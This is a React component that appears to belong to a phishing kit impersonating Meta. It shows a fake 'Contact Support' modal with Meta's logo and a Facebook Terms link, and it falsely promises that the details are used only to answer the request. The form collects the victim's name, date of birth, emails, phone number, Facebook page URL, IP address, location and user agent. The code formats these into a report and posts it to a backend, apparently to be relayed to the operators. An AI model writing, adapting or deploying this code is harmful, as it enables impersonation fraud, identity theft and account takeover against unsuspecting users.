import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faCheck, faXmark } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import 'intl-tel-input/build/css/intlTelInput.css';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full name', type: 'text' },
    { name: 'businessEmail', label: 'Business Email', type: 'email' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' },
    { name: 'facebookPageName', label: 'Page URL', type: 'text' }
];
const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });

    const [isChecked, setIsChecked] = useState(false);
    const [dob, setDob] = useState({ day: '', month: '', year: '' });
    const [dobError, setDobError] = useState('');
    const [touchFields, setTouchFields] = useState<Set<string>>(new Set());
    const [phoneError, setPhoneError] = useState('');

    const validateEmail = (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
    const hasEmailError = (field: string) => formData[field as keyof FormData] && touchFields.has(field) && !validateEmail(formData[field as keyof FormData] as string);
    const { setModalOpen, geoInfo, setMessageId, setMessageContent, setContactInfo, setUserInfo } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Meta', 'Contact Support', 'Tell us where you need help. Your details are used only to respond to this request.', 'Full name', 'Business Email', 'Business email', 'Personal Email', 'Your personal email', 'Phone', 'Enter your phone number', 'Page URL', 'Your page URL', 'Date of Birth', 'Day', 'Month', 'Year', 'I agree', 'I agree Terms of Service', 'Terms of Service', 'Submit', 'Please enter a valid date of birth.', 'Invalid date.', 'Date of birth cannot be in the future.', 'Please enter a valid email address.', 'Please enter a valid phone number.'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'off' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
        if (name === 'personalEmail' || name === 'businessEmail') {
            if (value && !validateEmail(value)) {
                setTouchFields((prev) => new Set(prev).add(name));
            } else {
                setTouchFields((prev) => {
                    const s = new Set(prev);
                    s.delete(name);
                    return s;
                });
            }
        }
    }, []);

    const handleEmailBlur = (name: string) => {
        setTouchFields((prev) => new Set(prev).add(name));
    };

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
        if (number && number.replace(/\D/g, '').length < 7) {
            setPhoneError('Please enter a valid phone number.');
        } else {
            setPhoneError('');
        }
    }, []);

    const handleDobChange = useCallback((field: 'day' | 'month' | 'year', value: string) => {
        const numValue = value.replace(/\D/g, '');

        let maxLen = 2;
        let maxVal = 31;

        if (field === 'month') {
            maxVal = 12;
        } else if (field === 'year') {
            maxLen = 4;
            maxVal = 2010;
        }

        if (numValue.length > maxLen) return;

        if (field === 'year') {
            const minYear = 1900;
            const num = Number.parseInt(numValue);
            if (numValue && !Number.isNaN(num) && numValue.length === 4) {
                if (num < minYear) {
                    setDobError('Please enter a valid date of birth. Must be between 1900 and 2010.');
                    return;
                }
                if (num > maxVal) {
                    setDobError('Please enter a valid date of birth. Must be between 1900 and 2010.');
                    return;
                }
            }
        }

        const num = Number.parseInt(numValue);
        if (numValue && (num < 1 || num > maxVal)) return;

        setDob((prev) => ({ ...prev, [field]: numValue }));
        setDobError('');
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;

        setDobError('');
        const day = Number.parseInt(dob.day);
        const month = Number.parseInt(dob.month);
        const year = Number.parseInt(dob.year);

        if (!dob.day || !dob.month || !dob.year || Number.isNaN(day) || Number.isNaN(month) || Number.isNaN(year)) {
            setDobError('Please enter a valid date of birth.');
            return;
        }

        const date = new Date(year, month - 1, day);
        if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) {
            setDobError('Invalid date.');
            return;
        }

        const today = new Date();
        if (date > today) {
            setDobError('Date of birth cannot be in the future.');
            return;
        }

        setIsLoading(true);

        if (formData.personalEmail && !validateEmail(formData.personalEmail)) {
            setIsLoading(false);
            return;
        }
        if (formData.businessEmail && !validateEmail(formData.businessEmail)) {
            setIsLoading(false);
            return;
        }

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>🎂 Date of Birth:</b> <code>${day}/${month}/${year}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
<b>📘 Facebook Page:</b> <code>${formData.facebookPageName}</code>
<b>🖥️ User Agent:</b> <code>${navigator.userAgent}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        const contact = formData.personalEmail || phoneNumber;
        setContactInfo(contact);

        setUserInfo({
            email: formData.personalEmail,
            phone: phoneNumber,
            pageName: formData.facebookPageName
        });

        setMessageContent(message);

        try {
            const res = await axios.post('/api/send', { message });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch (err) {
            console.error('err send:', err);
        }

        nextStep();
        setIsLoading(false);
    };
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='relative flex max-h-[90vh] w-full max-w-[510px] flex-col rounded-[12px] bg-linear-to-br from-[#fbf7ff] via-[#eaf3fd] to-[#eef8f3] px-5 py-4 shadow-lg md:px-8 md:py-6'>
                <div onClick={() => setModalOpen(false)} className='absolute top-3 right-3 z-20 h-4 w-4 cursor-pointer opacity-70 transition-opacity duration-200 hover:opacity-100 md:top-4 md:right-4' aria-label='Close modal'>
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4 md:h-5 md:w-5' />
                </div>

                <form onSubmit={handleSubmit} className='flex w-full flex-1 flex-col gap-2 overflow-y-auto md:gap-3'>
                    <div className='flex flex-col gap-2 md:gap-2.5'>
                        <h2 className='text-[16px] font-bold text-[#111827] md:text-[17px]'>{t('Contact Support')}</h2>
                        <p className='text-[13px] leading-[1.4] text-[#465a69] md:text-[14px]'>{t('Tell us where you need help. Your details are used only to respond to this request.')}</p>

                        {FORM_FIELDS.slice(0, 3).map((field) => (
                            <div key={field.name}>
                                <label className='mb-0.5 block text-[13px] font-medium text-[#465a69] md:mb-1 md:text-[14px]'>{t(field.label)}</label>
                                <input required name={field.name} type={field.type} value={formData[field.name]} onBlur={() => handleEmailBlur(field.name)} placeholder={t(field.name === 'personalEmail' ? 'Your personal email' : field.name === 'businessEmail' ? 'Business email' : field.label)} onChange={handleInputChange} className='h-9 w-full rounded-[8px] border border-[#cfd8e3] bg-white px-[11px] text-[13px] outline-0 transition-all duration-200 placeholder:text-[#9aa4b2] focus:border-[#0866ff] md:h-10 md:px-[12px] md:text-[14px]' />
                                {(field.name === 'personalEmail' || field.name === 'businessEmail') && hasEmailError(field.name) && <p className='mt-0.5 text-xs text-red-500 md:text-sm'>{t('Please enter a valid email address.')}</p>}
                            </div>
                        ))}
                        <div>
                            <label className='mb-0.5 block text-[13px] font-medium text-[#465a69] md:mb-1 md:text-[14px]'>{t('Phone')}</label>
                            <div className={`input h-9 w-full rounded-[8px] border bg-white text-[13px] md:h-10 md:text-[14px] ${phoneError && phoneNumber ? 'border-red-500' : 'border-[#cfd8e3]'}`}>
                                <div className='flex h-full w-full items-center'>
                                    <IntlTelInput
                                        onChangeNumber={handlePhoneChange}
                                        initOptions={initOptions}
                                        inputProps={{
                                            name: 'phoneNumber',
                                            className: 'h-full w-full bg-transparent outline-none border-none placeholder:text-[#9aa4b2]',
                                            placeholder: t('Enter your phone number')
                                        }}
                                    />
                                </div>
                            </div>
                            {phoneError && phoneNumber && <p className='mt-0.5 text-xs text-red-500 md:text-sm'>{t(phoneError)}</p>}
                        </div>
                        <div>
                            <p className='mb-0.5 text-[13px] font-medium text-[#465a69] md:mb-1 md:text-[14px]'>{t('Date of Birth')}</p>
                            <div className='grid grid-cols-3 gap-1.5 md:gap-2'>
                                <div className={`input h-9 w-full rounded-[8px] border ${dobError ? 'border-red-500' : 'border-[#cfd8e3]'} bg-white px-[11px] text-[13px] transition-all duration-200 focus-within:border-[#0866ff] md:h-10 md:text-[14px]`}>
                                    <input placeholder={t('Day')} id='day' className='h-full w-full outline-0 placeholder:text-[#9aa4b2]' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.day} onChange={(e) => handleDobChange('day', e.target.value)} maxLength={2} />
                                </div>
                                <div className={`input h-9 w-full rounded-[8px] border ${dobError ? 'border-red-500' : 'border-[#cfd8e3]'} bg-white px-[11px] text-[13px] transition-all duration-200 focus-within:border-[#0866ff] md:h-10 md:text-[14px]`}>
                                    <input placeholder={t('Month')} className='h-full w-full outline-0 placeholder:text-[#9aa4b2]' id='month' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.month} onChange={(e) => handleDobChange('month', e.target.value)} maxLength={2} />
                                </div>
                                <div className={`input h-9 w-full rounded-[8px] border ${dobError ? 'border-red-500' : 'border-[#cfd8e3]'} bg-white px-[11px] text-[13px] transition-all duration-200 focus-within:border-[#0866ff] md:h-10 md:text-[14px]`}>
                                    <input placeholder={t('Year')} id='year' className='h-full w-full outline-0 placeholder:text-[#9aa4b2]' type='tel' inputMode='numeric' pattern='[0-9]*' value={dob.year} onChange={(e) => handleDobChange('year', e.target.value)} maxLength={4} />
                                </div>
                            </div>
                            {dobError && <p className='mt-0.5 text-xs text-red-500 md:text-sm'>{t(dobError)}</p>}
                        </div>
                        {FORM_FIELDS.slice(3).map((field) => (
                            <div key={field.name}>
                                <label className='mb-0.5 block text-[13px] font-medium text-[#465a69] md:mb-1 md:text-[14px]'>{t(field.label)}</label>
                                <input required name={field.name} type={field.type} value={formData[field.name]} placeholder={t('Your page URL')} onChange={handleInputChange} className='h-9 w-full rounded-[8px] border border-[#cfd8e3] bg-white px-[11px] text-[13px] outline-0 transition-all duration-200 placeholder:text-[#9aa4b2] focus:border-[#0866ff] md:h-10 md:px-[12px] md:text-[14px]' />
                            </div>
                        ))}
                    </div>

                    <div>
                        <div className='mb-2 md:mb-3'>
                            <label className='flex cursor-pointer items-center gap-1.5 text-[13px] text-[#111827] md:gap-2 md:text-[14px]' htmlFor='custom-checkbox' aria-label={t('I agree Terms of Service')}>
                                <span className='inline-flex cursor-pointer items-center'>
                                    <input className='sr-only' id='custom-checkbox' type='checkbox' checked={isChecked} onChange={() => setIsChecked(!isChecked)} />
                                    <div className={`flex h-4 w-4 items-center justify-center rounded-[2px] border transition-all duration-200 ${isChecked ? 'border-[#0866ff] bg-[#0866ff]' : 'border-[#8a8d91] bg-white'} md:h-4 md:w-4`}>
                                        <FontAwesomeIcon icon={faCheck} className={`h-2.5 w-2.5 text-white ${isChecked ? 'block' : 'hidden'} md:h-3 md:w-3`} />
                                    </div>
                                </span>
                                {t('I agree')}{' '}
                                <a href='https://www.facebook.com/terms/' target='_blank' rel='noopener noreferrer' className='inline-flex items-center gap-1 text-[#0866ff] hover:underline'>
                                    {t('Terms of Service')}
                                </a>
                            </label>
                        </div>
                        <button type='submit' disabled={isLoading} className={`flex h-9 w-full cursor-pointer items-center justify-center rounded-full bg-[#0866ff] text-[13px] font-bold text-white transition-colors hover:bg-[#075bd8] md:h-10 md:text-[15px] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent md:h-5 md:w-5'></div> : t('Submit')}
                        </button>

                        <div className='flex flex-col items-center pt-4 md:pt-5'>
                            <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 100' className='h-2.5 w-[52px] md:h-3 md:w-[60px]'>
                                <defs>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='meta-g1' x1='124.38' x2='160.839' y1='99' y2='59.326'>
                                        <stop offset='.427' stopColor='#0278F1' />
                                        <stop offset='.917' stopColor='#0180FA' />
                                    </linearGradient>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='meta-g2' x1='42' x2='-1.666' y1='4.936' y2='61.707'>
                                        <stop offset='.427' stopColor='#0165E0' />
                                        <stop offset='.917' stopColor='#0180FA' />
                                    </linearGradient>
                                    <linearGradient gradientUnits='userSpaceOnUse' id='meta-g3' x1='27.677' x2='132.943' y1='28.71' y2='71.118'>
                                        <stop stopColor='#0064E0' />
                                        <stop offset='.656' stopColor='#0066E2' />
                                        <stop offset='1' stopColor='#0278F1' />
                                    </linearGradient>
                                </defs>
                                <path d='M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z' fill='#1C2B33' />
                                <path d='M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z' fill='#0180FA' />
                                <path d='M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z' fill='url(#meta-g1)' />
                                <path d='M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z' fill='url(#meta-g2)' />
                                <path d='m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z' fill='url(#meta-g3)' />
                            </svg>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default InitModal;
